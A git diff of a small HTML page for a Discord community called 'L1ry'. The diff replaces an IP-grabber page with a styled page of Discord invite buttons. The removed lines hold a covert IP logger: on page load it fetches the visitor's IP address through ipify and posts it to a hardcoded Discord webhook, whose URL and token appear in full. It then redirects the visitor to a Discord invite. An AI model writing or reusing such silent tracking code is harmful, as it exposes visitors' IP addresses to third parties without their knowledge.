@@ -1,27 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="ja">
 <head>
-    <title>IPアドレス取得ページ</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>!! L1ry server v2</title>
+    <style>
+        body {
+            font-family: 'Impact', sans-serif;
+            background-color: #000;
+            color: #fff;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 5em;
+            margin-top: 50px;
+            text-shadow: 2px 2px 4px #000;
+        }
+
+        p {
+            font-size: 1.5em;
+            margin: 20px;
+        }
+
+        .button {
+        display: inline-block;
+        padding: 15px 30px;
+        background-color: rgb(237, 0, 245);
+        color: white;
+        text-decoration: none;
+        border-radius: 10px;
+        margin-top: 50px;
+        margin-right: 20px; 
+        box-shadow: 3px 3px 6px #888;
+    }
+
+    h3 {
+        margin-top: 400px;
+    }
+    </style>
 </head>
 <body>
-    <script>
-        // Discord Webhook URL
-        var webhook_url = "https://discord.com/api/webhooks/1215230541012533329/QL6bid_K69KCm-K8W-kaCuZvdDDyP5eTr0Eoz_oOYp46GKUTNoKssoayrJlONmcmmkbU";
+<h1>L1ry community</h1>
+<p>Join discord server</p>
+<p>member 1000+</p>
+<a href="https://discord.gg/AhRgrxgSwj" class="button">L1ry server</a>
+<a href="https://discord.gg/pKf5w8zqV9" class="button">L1q server</a>
+<a href="https://discord.gg/2A2S8d5yu3" class="button">L1ry server v2</a>
 
-        // Get the user's IP address
-        function getIP(json) {
-            var ip_address = json.ip;
-            
-            // Send the IP address to Discord
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", webhook_url, true);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(JSON.stringify({ content: "↓入ってきてたらこいつの1p: " + ip_address }));
-            
-            // Redirect to Discord invite link
-            window.location.href = "https://discord.gg/Mx9kpAkF5p";
-        }
-    </script>
-    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+<h3>Admin L1ry</h3>
+<h4>support L1q</h4>
+<h5>Server >>> L1ry server</h5>
 </body>
 </html>
